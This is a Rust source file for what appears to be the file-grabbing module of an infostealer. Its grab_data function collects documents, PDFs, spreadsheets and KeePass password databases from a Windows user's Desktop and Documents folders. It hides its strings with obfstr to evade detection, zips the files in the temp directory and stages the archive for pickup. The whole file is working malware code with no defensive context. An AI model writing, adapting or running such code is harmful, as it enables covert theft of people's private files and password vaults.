use std::fs::*;
use std::io::*;
use walkdir::WalkDir;
use zip::write::*;

pub fn grab_data(path_in: String) -> Option<String> {
    let filename = format!("{}\\{}", &std::env::var("TEMP").unwrap(), obfstr::obfstr!("sensfiles.zip"));
    let path = std::path::Path::new(&filename);

    let file = std::fs::File::create(&path).unwrap();

    let mut zip_writer = zip::ZipWriter::new(file);
    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);

    let mut paths = vec![];

    paths.push(format!(
        "{}\\Desktop\\",
        std::env::var(obfstr::obfstr!("USERPROFILE")).unwrap()
    ));

    
    paths.push(format!(
        "{}\\Documents\\",
        std::env::var(obfstr::obfstr!("USERPROFILE")).unwrap()
    ));


    let mut valid_extensions: Vec<String> = vec![];
    valid_extensions.push(obfstr::obfstr!(".txt").to_string());
    valid_extensions.push(obfstr::obfstr!(".kdbx").to_string());
    valid_extensions.push(obfstr::obfstr!(".pdf").to_string());
    valid_extensions.push(obfstr::obfstr!(".doc").to_string());
    valid_extensions.push(obfstr::obfstr!(".docx").to_string());
    valid_extensions.push(obfstr::obfstr!(".xls").to_string());
    valid_extensions.push(obfstr::obfstr!(".xlsx").to_string());
    valid_extensions.push(obfstr::obfstr!(".ppt").to_string());
    valid_extensions.push(obfstr::obfstr!(".pptx").to_string());
    valid_extensions.push(obfstr::obfstr!(".odt").to_string());
    valid_extensions.push(obfstr::obfstr!(".odp").to_string());

    for path in paths {
        if std::path::Path::new(&path).exists() {
            for entry in WalkDir::new(&path)
                .max_depth(1)
                .into_iter()
                .filter_map(move |f| f.ok())
            {
                if let Ok(f) = &mut File::open(entry.path()) {
                    let mut buffer: Vec<u8> = match &f.metadata() {
                        Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                        Err(_) => Vec::new(),
                    };

                    if !valid_extensions
                        .iter()
                        .any(|suffix| entry.file_name().to_str().unwrap().ends_with(suffix.as_str()))
                    {
                        continue;
                    }

                    if buffer.capacity() >= 2097152  {
                        continue;
                    }

                    unsafe {
                        crate::FILES += 1;
                    }

                    if f.read_to_end(&mut buffer).is_ok()
                        && zip_writer
                            .start_file(entry.file_name().to_str().unwrap(), options)
                            .is_ok()
                    {
                        let _ = zip_writer.write_all(&buffer);
                    }
                }
            }
        }
    }

    zip_writer.finish().ok()?;

    unsafe {
        if crate::FILES > 0 {
            std::fs::copy(
                filename,
                format!(
                    "{path_in}\\{}",
                   obfstr::obfstr!("sensfiles.zip")
                ),
            )
            .ok();
        }
    }
    Some("".to_string())
}
